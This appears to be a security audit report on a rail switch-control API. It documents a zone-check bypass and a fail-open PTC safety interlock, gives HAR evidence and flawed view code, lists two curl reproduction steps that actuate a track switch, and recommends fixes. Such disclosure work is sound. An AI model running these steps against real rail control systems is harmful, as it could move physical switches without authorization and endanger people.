## Findings

1. **Zone-boundary bypass on `POST /api/v3/switches/{id}/actuate`**: the `actuate_switch` view in the Switch Management Service (SMS) does not re-verify that the requesting operator's `zone_id` matches the target switch's `zone_id` at the EXECUTE step. The zone check is performed only during the initial LOCK step. A `YARD_OPERATOR` scoped to `ZONE-YARD-A` can therefore substitute any switch ID in the URI (Pattern 1.13 — IoT/SCADA device ID manipulation) and actuate assets in `ZONE-MAIN-LINE-C` without any zone enforcement at the critical final step.

2. **Fail-open on missing `X-PTC-Verified` header (Pattern 8.3 — RISK-RAIL-007)**: the SMS `actuate_switch` view defaults to ALLOW when the `X-PTC-Verified` header is absent (`if not ptc_verified_header: log.warning(...)`). An attacker who omits the header entirely bypasses the PTC safety interlock. The HAR response confirms this: the body contains `"warning": "PTC check header was missing in request."` alongside `"status": "ACTUATION_SUCCESS"`.

## Evidence

- **HAR request** (`startedDateTime: 2026-04-09T17:35:10.011Z`, elapsed 780 ms): `POST https://api.railgrid.ops/api/v3/switches/SW-MAIN-001/actuate`; bearer JWT encodes `zone_id: ZONE-YARD-A`, `role: yard_operator`, `employee_id: user_demo`; `X-PTC-Verified` header is absent from the request headers array; body `{"target_state": "REVERSE", "reason": "Unauthorized Test Override"}`.
- **HAR response**: HTTP 200 OK; `x-plc-command-ack: ACK_SW_001_RVR` confirms the PLC received and acknowledged the REVERSE command for switch `SW-MAIN-001`; body `{"status": "ACTUATION_SUCCESS", "switch_id": "SW-MAIN-001", "new_state": "REVERSE", "warning": "PTC check header was missing in request."}`.
- **Flawed view code** (section 6.0, `actuate_switch`): the commented-out zone check `# if switch.zone_id != user_zone: return Response({"error": "Unauthorized zone."...})` is never executed. The only active authorization check is `if not switch.is_locked or switch.locked_by != user_id`, which verifies only the LOCK step prerequisite, not the zone boundary.
- **Fail-open branch**: `ptc_verified_header = request.headers.get('X-PTC-Verified')` followed by `if not ptc_verified_header: log.warning(...)` then falls through to `plc_service.send_command(switch_id, new_state)` unconditionally.
- **Asset registry** (section 5.0): `SW-MAIN-001` belongs to `zone_id: ZONE-MAIN-LINE-C`; the attacker's operator record has `zone_id: ZONE-YARD-A` — these do not match, and the missing enforcement is the direct cause.

## Reproduction

Step 1 — obtain a LOCK on SW-MAIN-001 using the yard-operator credentials (the initial check does not validate zone boundary):

```bash
curl -i -X POST "https://api.railgrid.ops/api/v3/switches/SW-MAIN-001/lock" \
  -H "Authorization: Bearer <JWT_user_yard_1004_ZONE-YARD-A>" \
  -H "Content-Type: application/json" \
  -d '{"reason": "Maintenance lock"}'
```

Step 2 — invoke the ACTUATE endpoint, omitting `X-PTC-Verified` to trigger fail-open:

```bash
curl -i -X POST "https://api.railgrid.ops/api/v3/switches/SW-MAIN-001/actuate" \
  -H "Authorization: Bearer <JWT_user_yard_1004_ZONE-YARD-A>" \
  -H "Content-Type: application/json" \
  -H "x-request-context: HMI_MANUAL_ACTUATION" \
  -d '{"target_state": "REVERSE", "reason": "Unauthorized Test Override"}'
```

Expected secure outcome: HTTP 403 — operator zone `ZONE-YARD-A` does not match switch zone `ZONE-MAIN-LINE-C`, or HTTP 403 — PTC safety interlock not verified.  
Observed vulnerable outcome: HTTP 200 with `"status": "ACTUATION_SUCCESS"`, `"switch_id": "SW-MAIN-001"`, `"new_state": "REVERSE"`, `"warning": "PTC check header was missing in request."`, and `x-plc-command-ack: ACK_SW_001_RVR` — physical track switch SW-MAIN-001 rotated to REVERSE.

## Remediation

- **Enforce zone boundary at EXECUTE**: in `actuate_switch`, un-comment and activate the zone check — `if switch.zone_id != user_zone: return Response({"error": "Unauthorized zone."}, status=403)` — before proceeding to the PLC command. This check must occur after the lock check, so that zone and ownership are both validated at the critical step.
- **Fail-closed on missing PTC header (resolve RISK-RAIL-007)**: change the fail-open branch to an explicit denial: `if not ptc_verified_header: return Response({"error": "PTC safety interlock required."}, status=403)`. Never default safety interlocks to ALLOW on missing input.
- **Re-validate zone at every workflow step**: the LOCK, VALIDATE-SAFETY, and ACTUATE endpoints must each independently verify that `switch.zone_id == user_zone` from the JWT, preventing the pattern where passing an early step grants implicit permission for later steps (Pattern 3.5).
- **Treat `X-PTC-Verified` as a mandatory server-side verification result**, not a client-supplied header — move PTC status lookup to the SMS service itself rather than trusting a header from the caller.
